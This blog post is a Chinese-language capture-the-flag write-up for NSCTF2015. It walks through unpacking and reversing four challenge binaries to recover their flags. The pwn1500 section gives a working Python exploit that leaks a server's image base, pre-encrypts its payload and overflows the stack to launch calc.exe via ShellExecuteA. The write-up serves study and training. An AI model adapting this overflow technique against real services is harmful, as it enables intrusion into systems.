---
layout: post
title: NSCTF2015 writeup 逆向部分
category: writeup
tags: reverse
keywords: 
description: 
---

## 一、reverse100

此题经过aspack加壳，用工具脱壳后，扔ida里面

```asm
UnPackEr:00401070 ; int __cdecl main(int argc, const char **argv, const char **envp)
UnPackEr:00401070 _main           proc near               ; CODE XREF: ___tmainCRTStartup+F8p
UnPackEr:00401070
UnPackEr:00401070 Str2            = byte ptr -104h
UnPackEr:00401070 Dst             = byte ptr -103h
UnPackEr:00401070 var_4           = dword ptr -4
UnPackEr:00401070 argc            = dword ptr  8
UnPackEr:00401070 argv            = dword ptr  0Ch
UnPackEr:00401070 envp            = dword ptr  10h
UnPackEr:00401070
UnPackEr:00401070                 push    ebp
UnPackEr:00401071                 mov     ebp, esp
UnPackEr:00401073                 sub     esp, 108h
UnPackEr:00401079                 mov     eax, ds:dword_403000
UnPackEr:0040107E                 xor     eax, ebp
UnPackEr:00401080                 mov     [ebp+var_4], eax
UnPackEr:00401083                 push    ebx
UnPackEr:00401084                 push    esi
UnPackEr:00401085                 push    edi
UnPackEr:00401086                 push    0FFh            ; Size
UnPackEr:0040108B                 lea     eax, [ebp+Dst]
UnPackEr:00401091                 mov     [ebp+Str2], 0
UnPackEr:00401098                 push    0               ; Val
UnPackEr:0040109A                 push    eax             ; Dst
UnPackEr:0040109B                 call    memset
UnPackEr:004010A0                 mov     esi, ds:printf
UnPackEr:004010A6                 push    offset Format   ; "please input ns-ctf password: "
UnPackEr:004010AB                 call    esi ; printf
UnPackEr:004010AD                 mov     ebx, ds:scanf_s
UnPackEr:004010B3                 lea     eax, [ebp+Str2]
UnPackEr:004010B9                 push    eax
UnPackEr:004010BA                 push    offset aS       ; "%s"
UnPackEr:004010BF                 call    ebx ; scanf_s
UnPackEr:004010C1                 push    0Bh             ; MaxCount
UnPackEr:004010C3                 lea     eax, [ebp+Str2]
UnPackEr:004010C9                 mov     edi, 1
UnPackEr:004010CE                 push    eax             ; Str2
UnPackEr:004010CF                 push    offset Str1     ; "nsF0cuS!x01"
UnPackEr:004010D4                 call    ds:strncmp
UnPackEr:004010DA                 add     esp, 24h
UnPackEr:004010DD                 test    eax, eax
UnPackEr:004010DF                 jz      short loc_40112C
UnPackEr:004010E1
UnPackEr:004010E1 loc_4010E1:                             ; CODE XREF: _main+BAj
UnPackEr:004010E1                 push    offset aTryAgain ; "try again!\n"
UnPackEr:004010E6                 call    esi ; printf
UnPackEr:004010E8                 push    100h            ; Size
UnPackEr:004010ED                 lea     eax, [ebp+Str2]
UnPackEr:004010F3                 push    0               ; Val
UnPackEr:004010F5                 push    eax             ; Dst
UnPackEr:004010F6                 call    memset
UnPackEr:004010FB                 push    offset Format   ; "please input ns-ctf password: "
UnPackEr:00401100                 call    esi ; printf
UnPackEr:00401102                 lea     eax, [ebp+Str2]
UnPackEr:00401108                 push    eax
UnPackEr:00401109                 push    offset aS       ; "%s"
UnPackEr:0040110E                 call    ebx ; scanf_s
UnPackEr:00401110                 push    0Bh             ; MaxCount
UnPackEr:00401112                 lea     eax, [ebp+Str2]
UnPackEr:00401118                 inc     edi
UnPackEr:00401119                 push    eax             ; Str2
UnPackEr:0040111A                 push    offset Str1     ; "nsF0cuS!x01"
UnPackEr:0040111F                 call    ds:strncmp
UnPackEr:00401125                 add     esp, 28h
UnPackEr:00401128                 test    eax, eax
UnPackEr:0040112A                 jnz     short loc_4010E1
UnPackEr:0040112C
UnPackEr:0040112C loc_40112C:                             ; CODE XREF: _main+6Fj
UnPackEr:0040112C                 lea     ecx, [ebp+Str2]
UnPackEr:00401132                 mov     ds:dword_403368, 1
UnPackEr:0040113C                 lea     edx, [ecx+1]
UnPackEr:0040113F                 nop
UnPackEr:00401140
UnPackEr:00401140 loc_401140:                             ; CODE XREF: _main+D5j
UnPackEr:00401140                 mov     al, [ecx]
UnPackEr:00401142                 inc     ecx
UnPackEr:00401143                 test    al, al
UnPackEr:00401145                 jnz     short loc_401140
UnPackEr:00401147                 sub     ecx, edx
UnPackEr:00401149                 jz      short loc_401172
UnPackEr:0040114B                 cmp     edi, 3
UnPackEr:0040114E                 jle     short loc_401168
UnPackEr:00401150                 call    sub_401000
UnPackEr:00401155                 pop     edi
UnPackEr:00401156                 pop     esi
UnPackEr:00401157                 xor     eax, eax
UnPackEr:00401159                 pop     ebx
UnPackEr:0040115A                 mov     ecx, [ebp+var_4]
UnPackEr:0040115D                 xor     ecx, ebp
UnPackEr:0040115F                 call    sub_401185
UnPackEr:00401164                 mov     esp, ebp
UnPackEr:00401166                 pop     ebp
UnPackEr:00401167                 retn
UnPackEr:00401168 ; ---------------------------------------------------------------------------
UnPackEr:00401168
UnPackEr:00401168 loc_401168:                             ; CODE XREF: _main+DEj
UnPackEr:00401168                 push    offset Src      ; "flag:{NSCTF_md5065ca>01??ab7e0f4>>a701c"...
UnPackEr:0040116D                 call    esi ; printf
UnPackEr:0040116F                 add     esp, 4
UnPackEr:00401172
UnPackEr:00401172 loc_401172:                             ; CODE XREF: _main+D9j
UnPackEr:00401172                 mov     ecx, [ebp+var_4]
UnPackEr:00401175                 xor     eax, eax
UnPackEr:00401177                 pop     edi
UnPackEr:00401178                 pop     esi
UnPackEr:00401179                 xor     ecx, ebp
UnPackEr:0040117B                 pop     ebx
UnPackEr:0040117C                 call    sub_401185
UnPackEr:00401181                 mov     esp, ebp
UnPackEr:00401183                 pop     ebp
UnPackEr:00401184                 retn
UnPackEr:00401184 _main           endp
UnPackEr:00401184
UnPackEr:00401185
```

main的逻辑就是错误尝试3次以上，再输入正确的password：nsF0cuS!x01，会调用`sub_401000`对flage进行修正，从而返回正确的flage。

![rev100](/public/img/2015-09-28-rev100.png)


## 二、reverse250

这题是一个对话框程序，按钮是灰的，不管他，直接扔ida里面看。`DialogFunc`函数名就告诉我们消息处理函数

```asm
push    400h            ; cchMax
lea     eax, [ebp+String]
push    eax             ; lpString
push    3E9h            ; nIDDlgItem
push    esi             ; hDlg
call    ds:GetDlgItemTextA
lea     ecx, [ebp+String]
call    sub_401070
jmp     short loc_401221
```

看到对用户输入的处理函数`sub_401070`，貌似函数的地址都和第一题一样。这个函数里面的关键部分：

![rev250](/public/img/2015-09-28-rev250.png)

又见到熟悉的`sub_401000`，好了，用OD停在入口点，修改EIP，到这个函数，就可以看到正确答案的对话框了。


## 三、reverse400

此题有点小难了，主要是因为没有接触过C调用python这种编程。找了一个例子，算是了解了一个大概，[ C++调用Python浅析](http://blog.csdn.net/magictong/article/details/8947892),关键点就是C代码中调用python解析器的地方。
先说一下整个程序的流程，实际上就是检测环境变量`_MEIPASS2`，这个变量保存python虚拟机需要的标准类库。没有的话，程序运行生成分支，然后重新`CreateProcess`自身，等待运行结束，清理`_MEIPASS2`。显然手动设置这个环境变量，指向需要的python标准类库，可以运行所需要的脚本解析分支。在这里我被IDA坑了许久，`getenv`这个函数在IDA的win32 local debugger下，总是返回空。最后换成OD就好了，没有具体研究原因，貌似里面有一个反调试函数，od（没有hide插件）走不到，但ida win32 local debugger会走到，但修改返回值，`getenv`仍然返回空。懒得继续研究了，还望有大牛能对此指点一二。
下面来看代码中调用python解析器的关键部分：

```asm
.text:00401DB4 loc_401DB4:             ; "Py_IncRef"
.text:00401DB4 push    offset aPy_incref
.text:00401DB9 push    esi             ; hModule
.text:00401DBA call    edi ; GetProcAddress
.text:00401DBC push    offset aPy_decref ; "Py_DecRef"
.text:00401DC1 push    esi             ; hModule
.text:00401DC2 mov     dword_41C258, eax
.text:00401DC7 call    edi ; GetProcAddress
.text:00401DC9 push    offset aPyimport_execc ; "PyImport_ExecCodeModule"
.text:00401DCE push    esi             ; hModule
.text:00401DCF mov     dword_41C25C, eax
.text:00401DD4 call    edi ; GetProcAddress
.text:00401DD6 mov     dword_41C260, eax
.text:00401DDB test    eax, eax
.text:00401DDD jnz     short loc_401DF2
```

跟踪`call dword_41C25C`地方，在函数`sub_403470`里面

```asm
.text:004034FD sub     eax, edx
.text:004034FF push    eax
.text:00403500 lea     ecx, [esp+124h+var_108]
.text:00403504 push    ecx
.text:00403505 call    dword_41C288    ; PyString_FromStringAndSize
.text:0040350B mov     edx, [esp+128h+var_10C]
.text:0040350F mov     esi, eax
.text:00403511 push    esi
.text:00403512 push    offset a__file__ ; "__file__"
.text:00403517 push    edx
.text:00403518 call    dword_41C278    ; PyObject_SetAttrString
.text:0040351E push    esi
.text:0040351F call    dword_41C25C    ; PyImport_ExecCodeModule
.text:00403525 push    ebx
.text:00403526 call    dword_41C264    ; PyRun_SimpleString
.text:0040352C add     esp, 1Ch
.text:0040352F test    eax, eax
.text:00403531 jnz     short loc_40356F
```

在`00403526`处下断点，可以捕获4段python脚本，看最后一段

```python
data = \
"\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b" +\
"\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72" +\
"\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b"

'''
char buf[] = "flag:{NSCTF_md5098f6bcd4621d373cade4e832627b4f6}";

int _tmain(int argc, _TCHAR* argv[])
{
	printf("%d\n", strlen(buf));
	char key = '\x0b';
	buf[47] ^= key;
	for (int i = 1; i < 48; i++)
	{
		buf[48 - i - 1] ^= buf[48 - i];
	}

	return 0;
}
'''

print "Revese it?????????"
```

这一段python脚本中，注释的C代码，貌似是对`data`的解释，实际上干扰还是比较大的。

```c
//char buf[] = "flag:{NSCTF_md5098f6bcd4621d373cade4e832627b4f6}";

char buf[] = "\x1c\x7a\x16\x77\x10\x2a\x51\x1f\x4c\x0f\x5b\x1d\x42\x2f\x4b\x7e\x4a\x7a\x4a\x7b\x49\x7f\x4a\x7f\x1e\x78\x4c\x75\x10\x28\x18\x2b\x48\x7e\x46\x23\x12\x24\x11\x72\x4b\x2e\x1b\x7e\x4f\x2b\x12\x76\x0b";

int main(int argc, char* argv[])
{
	printf("%d\n", strlen(buf));	

	for (int i = 0; i < 49; i++)
	{
		buf[i] ^= buf[i+1];
	}
	
	printf("%s\n", buf);
	return 0;
}
```


## 四、reverse500

这是一个pyc的python伪代码程序。以前没有接触过。github上找了几个反编译工具，貌似都不能成功。只能自己研究了。基本上这是一个快速学习的题目，借鉴delvak虚拟机的smali伪代码，可以快速掌握python opcode的大概思路，貌似更简洁和简单。

第一步，使用python自己的dis，翻译出opcode，pyc整个的程序实际上就是一个`PyCodeObject`对象。dis就是对这个对象执行serialise。

第二步，分析opcode还原python代码

```python
data = "M,\x1d-\x18}E'\x1ezN~\x1b*\x19+\x12%\x1d-" + \
		'I\x7fM(I{I\x7fJ.\x16wWcRj\x0e6\x0fn' + \
		'Zo\nn\x0fk\t1R7\x03g\x067\x00eUb\x043' + \
		'\x014\x071Rr\x14x\x19~D?q"a5s,A%' + \
		"\x10'\x11uLyA%\x1d|DrFv\x12t\x11#B&" + \
		'GsKzK*O)\x1c%GuC>\x1e\x7f\x1b+\x19*' + \
		'\x1e&\x14-\x1f/\x1axAqBq@yO-LtE}' + \
		'\x1b,MuBp\x12'

import os, sys, struct, cStringIO, string, dis, marshal, types, random

count = 0

def reverse(string):
	return string[::-1]

data_list = list(reverse(data))


def decrypt(c, key2):
	global data_list
	global count

	data_list[count] = c ^ key2
	count += 1

def GetFlag1():
	global count

	key, = struct.unpack('B', data[len(data)-8])
	#key = (struct.unpack('B', data[len(data)-8]))[0]
	#print chr(key)
	#print struct.unpack('B', data[len(data)-8])

	for c in data_list:
		if count == 0:
			decrypt(struct.unpack('B', c)[0], key)
		else:
			key, = struct.unpack('B', data[len(data)-3])
			decrypt(struct.unpack('B', c)[0], key)

	print data_list[::-1]

def GetFlag2():
	global count

	key, = struct.unpack('B', data[len(data)-11])

	for c in data_list:
		if count == 0:
			decrypt(struct.unpack('B', c)[0], key)
		else:
			key, = struct.unpack('B', data[len(data)-4-count])
			decrypt(struct.unpack('B', c)[0], key)

	print data_list[::-1]


def GetFlag3():
	global count

	key, = struct.unpack('B', data[len(data)-5])

	for c in data_list:
		if count == 0:
			decrypt(struct.unpack('B', c)[0], key)
		else:
			key, = struct.unpack('B', data[len(data)-2-count])
			decrypt(struct.unpack('B', c)[0], key)

	#print data_list[::-1]
	for m in data_list[::-1]:
		sys.stdout.write(chr(m))


def GetFlag4():
	pass

def GetFlag5():
	pass

GetFlag3()
```

貌似试到第三个解密函数就出flag了，实际上这5个`GetFlag`差不多，就是减去的常数有些差别。

最后对这个pyc无法用工具反编译的原因分析：感觉是因为开头的8字节，对于整个程序来说是多余的，并且有NOP，导致无法翻译成python代码。我将8直接都改成NOP还是出现错误，应该问题是一样的，貌似需要将这8直接改成能翻译成python语句的opcode才行。看看python的opcode大多是3字节，要凑8字节的语句也是烧脑，还是算了。

```
 <dis>
  8           0 NOP                 
              1 LOAD_CONST               0 ("M,\x1d-\x18}E'\x1ezN~\x1b*\x19+\x12%\x1d-")
              4 LOAD_CONST               0 ("M,\x1d-\x18}E'\x1ezN~\x1b*\x19+\x12%\x1d-")
              7 NOP                 
              8 LOAD_CONST               0 ("M,\x1d-\x18}E'\x1ezN~\x1b*\x19+\x12%\x1d-")
```


## 五、pwn1500

这个程序其实并不难，只是加了一个aspack的壳。这个壳脱起来还是非常简单的只要栈平衡，关注段间跳转，熟悉start函数干些什么，很容就能跟到main，关键是里面有非常人性化的函数

```asm
UnPackEr:00401530 2CC push    5               ; nShowCmd
UnPackEr:00401532 2D0 push    0               ; lpDirectory
UnPackEr:00401534 2D4 push    0               ; lpParameters
UnPackEr:00401536 2D8 lea     ecx, [esp+2D4h+File]
UnPackEr:0040153A 2D8 push    ecx             ; lpFile
UnPackEr:0040153B 2DC push    offset Operation ; "open"
UnPackEr:00401540 2E0 push    0               ; hwnd
UnPackEr:00401542 2E4 call    ds:ShellExecuteA
```

连参数都帮你考虑到了。不涉及ret到IAT函数，那么带壳和脱壳OEP的相对地址都是一样的。

题目要求过DEP和ASLR，那么一定要有确定Image基址的地方。这里出题人也非常人性化

```asm
UnPackEr:00401263 6E0                 push    7               ; size_t
UnPackEr:00401265 6E4                 lea     edx, [ebp+DstBuf]
UnPackEr:0040126B 6E4                 push    offset aStatus  ; "STATUS"
UnPackEr:00401270 6E8                 push    edx             ; char *
UnPackEr:00401271 6EC                 call    _strncmp
UnPackEr:00401276 6EC                 add     esp, 0Ch
UnPackEr:00401279 6E0                 test    eax, eax
UnPackEr:0040127B 6E0                 jnz     short loc_4012DA
UnPackEr:0040127D 6E0                 push    eax             ; lpModuleName
UnPackEr:0040127E 6E4                 call    ds:GetModuleHandleA
UnPackEr:00401284 6E0                 push    5ACh            ; size_t
UnPackEr:00401289 6E4                 mov     esi, eax
UnPackEr:0040128B 6E4                 lea     eax, [ebp+DstBuf]
UnPackEr:00401291 6E4                 push    0               ; int
UnPackEr:00401293 6E8                 push    eax             ; void *
UnPackEr:00401294 6EC                 call    _memset
UnPackEr:00401299 6EC                 push    esi
UnPackEr:0040129A 6F0                 push    offset Format   ; "OK: Current Module Load @ 0x%.8X\n"
UnPackEr:0040129F 6F4                 lea     ecx, [ebp+DstBuf]
UnPackEr:004012A5 6F4                 push    5ACh            ; SizeInBytes
UnPackEr:004012AA 6F8                 push    ecx             ; DstBuf
UnPackEr:004012AB 6FC                 call    _sprintf_s
UnPackEr:004012B0 6FC                 lea     eax, [ebp+DstBuf]
UnPackEr:004012B6 6FC                 add     esp, 1Ch
UnPackEr:004012B9 6E0                 lea     edx, [eax+1]
UnPackEr:004012BC 6E0                 lea     esp, [esp+0]
```

发送`STATUS`命令就能人性化的告诉你imageBase。

下面就是寻找溢出点。这个跨了两个函数

```asm
UnPackEr:004010C0     ; int __cdecl sub_4010C0(SOCKET s, int)
UnPackEr:004010C0     sub_4010C0 proc near
UnPackEr:004010C0
UnPackEr:004010C0     buf= byte ptr -204h
UnPackEr:004010C0     var_200= byte ptr -200h
UnPackEr:004010C0     s= dword ptr  4
UnPackEr:004010C0     arg_4= dword ptr  8
UnPackEr:004010C0
UnPackEr:004010C0 000 sub     esp, 204h
UnPackEr:004010C6 204 mov     eax, [esp+204h+arg_4]
UnPackEr:004010CD 204 movzx   ecx, word ptr [eax]
UnPackEr:004010D0 204 push    ebx
UnPackEr:004010D1 208 push    esi
UnPackEr:004010D2 20C add     eax, 2
UnPackEr:004010D5 20C push    edi
UnPackEr:004010D6 210 push    eax
UnPackEr:004010D7 214 lea     eax, [esp+214h+var_200]
UnPackEr:004010DB 214 movzx   ebx, cx
UnPackEr:004010DE 214 push    eax
UnPackEr:004010DF 218 mov     dword ptr [esp+218h+buf], ecx
UnPackEr:004010E3 218 call    sub_401030
UnPackEr:004010E8 218 mov     esi, [esp+218h+s]
UnPackEr:004010EF 218 mov     edi, ds:send
UnPackEr:004010F5 218 add     esp, 8
UnPackEr:004010F8 210 push    0               ; flags
UnPackEr:004010FA 214 push    2               ; len
UnPackEr:004010FC 218 lea     ecx, [esp+218h+buf]
UnPackEr:00401100 218 push    ecx             ; buf
UnPackEr:00401101 21C push    esi             ; s
UnPackEr:00401102 220 call    edi ; send
UnPackEr:00401104 210 movzx   edx, word ptr [esp+210h+buf]
UnPackEr:00401109 210 push    0               ; flags
UnPackEr:0040110B 214 push    edx             ; len
UnPackEr:0040110C 218 lea     eax, [esp+218h+var_200]
UnPackEr:00401110 218 push    eax             ; buf
UnPackEr:00401111 21C push    esi             ; s
UnPackEr:00401112 220 call    edi ; send
UnPackEr:00401114 210 pop     edi
UnPackEr:00401115 20C pop     esi
UnPackEr:00401116 208 pop     ebx
UnPackEr:00401117 204 add     esp, 204h
UnPackEr:0040111D 000 retn
UnPackEr:0040111D     sub_4010C0 e
```

```asm
UnPackEr:00401030     sub_401030      proc near               ; CODE XREF: sub_4010C0+23p
UnPackEr:00401030
UnPackEr:00401030                                        ; fast arg <ebx> payload长度
UnPackEr:00401030     arg_0           = dword ptr  4    ; 调用者的栈地址，溢出点
UnPackEr:00401030     arg_4           = dword ptr  8    ; payload 栈地址
UnPackEr:00401030
UnPackEr:00401030 000                 cmp     ds:byte_40F95C, 0
UnPackEr:00401037 000                 push    ebp
UnPackEr:00401038 004                 mov     ebp, [esp+4+arg_0]
UnPackEr:0040103C 004                 push    esi
UnPackEr:0040103D 008                 push    edi
UnPackEr:0040103E 00C                 jnz     short loc_40107A
UnPackEr:00401040 00C                 push    0               ; Time
UnPackEr:00401042 010                 call    __time64
UnPackEr:00401047 010                 push    eax             ; unsigned int
UnPackEr:00401048 014                 call    _srand
UnPackEr:0040104D 014                 add     esp, 8
UnPackEr:00401050 00C                 mov     esi, offset dword_40F968 ; int rand[32]
UnPackEr:00401055
UnPackEr:00401055     loc_401055:                             ; CODE XREF: sub_401030+41j
UnPackEr:00401055 00C                 call    _rand
UnPackEr:0040105A 00C                 mov     edi, eax
UnPackEr:0040105C 00C                 shl     edi, 10h
UnPackEr:0040105F 00C                 call    _rand
UnPackEr:00401064 00C                 add     eax, edi
UnPackEr:00401066 00C                 mov     [esi], eax
UnPackEr:00401068 00C                 add     esi, 4
UnPackEr:0040106B 00C                 cmp     esi, offset dword_40F9E8
UnPackEr:00401071 00C                 jl      short loc_401055
UnPackEr:00401073 00C                 mov     ds:byte_40F95C, 1
UnPackEr:0040107A
UnPackEr:0040107A     loc_40107A:                             ; CODE XREF: sub_401030+Ej
UnPackEr:0040107A 00C                 mov     eax, ebx
UnPackEr:0040107C 00C                 cdq
UnPackEr:0040107D 00C                 and     edx, 3
UnPackEr:00401080 00C                 add     eax, edx
UnPackEr:00401082 00C                 sar     eax, 2
UnPackEr:00401085 00C                 test    bl, 3
UnPackEr:00401088 00C                 jz      short loc_40108B
UnPackEr:0040108A 00C                 inc     eax
UnPackEr:0040108B
UnPackEr:0040108B     loc_40108B:                             ; CODE XREF: sub_401030+58j
UnPackEr:0040108B 00C                 xor     edx, edx
UnPackEr:0040108D 00C                 test    eax, eax
UnPackEr:0040108F 00C                 jle     short loc_4010B9
UnPackEr:00401091 00C                 mov     esi, [esp+0Ch+arg_4]
UnPackEr:00401095 00C                 mov     ecx, ebp
UnPackEr:00401097 00C                 sub     esi, ebp
UnPackEr:00401099 00C                 lea     esp, [esp+0]
UnPackEr:004010A0
UnPackEr:004010A0     loc_4010A0:                             ; CODE XREF: sub_401030+87j
UnPackEr:004010A0 00C                 mov     edi, edx
UnPackEr:004010A2 00C                 and     edi, 1Fh
UnPackEr:004010A5 00C                 mov     edi, ds:dword_40F968[edi*4]
UnPackEr:004010AC 00C                 xor     edi, [esi+ecx]
UnPackEr:004010AF 00C                 inc     edx
UnPackEr:004010B0 00C                 mov     [ecx], edi
UnPackEr:004010B2 00C                 add     ecx, 4
UnPackEr:004010B5 00C                 cmp     edx, eax
UnPackEr:004010B7 00C                 jl      short loc_4010A0
UnPackEr:004010B9
UnPackEr:004010B9     loc_4010B9:                             ; CODE XREF: sub_401030+5Fj
UnPackEr:004010B9 00C                 pop     edi
UnPackEr:004010BA 008                 pop     esi
UnPackEr:004010BB 004                 pop     ebp
UnPackEr:004010BC 000                 retn
UnPackEr:004010BC     sub_401030      endp
```

简单来说`ENCRYPT `后的`WORD`会作为`payload`的长度字段，`sub_401030`需要执行两次，第一次`int[32]`随机数生成，第二次覆盖`sub_4010C0`的返回地址。

具体利用的话，需要注意的就是payload会被int[32]加密，所以提交的payload需要提前对ret地址和字符串参数进行加密。
还有就是字符串存放的位置，需要清楚的知道ret的时候esp的当前位置，以及push了两次以后的位置+3Ch。

```python
import socket, sys, struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.102', 2994))

print sock.recv(1024)

sock.send('STATUS')
str = sock.recv(1024)
str = str[str.index('0x')::]
imgBase = int(str, 16)
print hex(imgBase)

ShellExeWithArgs = imgBase + 0x1530

sock.send('ENCRYPT '+'\x00\x01'+'\x00'*256)
a = sock.recv(2)
print struct.unpack("H", a)

b = sock.recv(1024)
fmt = "%di" % (len(b) / 4)
print fmt
c = struct.unpack(fmt, b)

print hex(ShellExeWithArgs), hex(ShellExeWithArgs ^ c[0])

calc = 'c:\\windows\\system32\\calc.exe' + '\x00'*4

d = struct.unpack('<8i', calc)
print d 

enc = []
for i in range(0, len(d)):
    enc.append(d[i] ^ c[i+13])

print hex(enc[0]), hex(enc[0]^c[13])

#print hex(ShellExeWithArgs ^ c[0])
payload = struct.pack('=8sH512si48s8i', 'ENCRYPT ', 8+512+4+48+len(calc), '\x61'*512, ShellExeWithArgs ^ c[0], '\00'*48, enc[0], enc[1], enc[2], enc[3], enc[4], enc[5], enc[6], enc[7])
#print payload
sock.send(''.join(payload))
```

第一次用python写漏洞利用代码，实在是坑，不熟悉啊。

